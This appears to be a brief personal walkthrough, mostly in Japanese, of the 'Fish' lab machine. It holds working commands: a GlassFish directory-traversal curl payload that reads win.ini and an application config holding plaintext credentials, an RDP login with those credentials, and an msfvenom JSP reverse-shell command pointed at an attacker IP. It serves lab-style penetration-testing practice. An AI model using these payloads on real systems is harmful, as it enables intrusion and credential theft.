Recon＆Enum

└─$ sudo nmap -Pn -n 192.168.145.168 -p- -sC -sV --min-rate=5000 -oX fish.xml

![[wt image 206.png]]

![[wt image 207.png]]

![[wt image 208.png]]

4848

![[wt image 209.png]]

ディレクトリトラバーサル

https://www.exploit-db.com/exploits/39441

脆弱性の確認

└─$ curl http://192.168.145.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

![[wt image 210.png]]

最上位のフォルダ内にあるSynamanというアプリについて調べる

![[wt image 211.png]]

└─$ curl http://192.168.145.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaman/config/AppConfig.xml

![[wt image 212.png]]

\<parameter name="smtpUser" type="1" value="arthur">\</parameter>

\<parameter name="smtpPassword" type="1" value="KingOfAtlantis">\</parameter>

InitialAccess

└─$ xfreerdp3 /u:'arthur' /p:'KingOfAtlantis' /v:192.168.145.168 /dynamic-resolution +clipboard

![[wt image 213.png]]

PE

![[wt image 214.png]]

==🔴msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.====🔴231== ==🔴LPORT=443 -f war >shell.war==

貼り付け元  \<https://medium.com/@Fasil713/fish-pg-walkthrough-e844a4f5c4bf>

![[wt image 215.png]]

Launch

![[wt image 216.png]]

Access　URL

![[wt image 217.png]]

Shell

![[wt image 218.png]]

Flag

![[wt image 219.png]]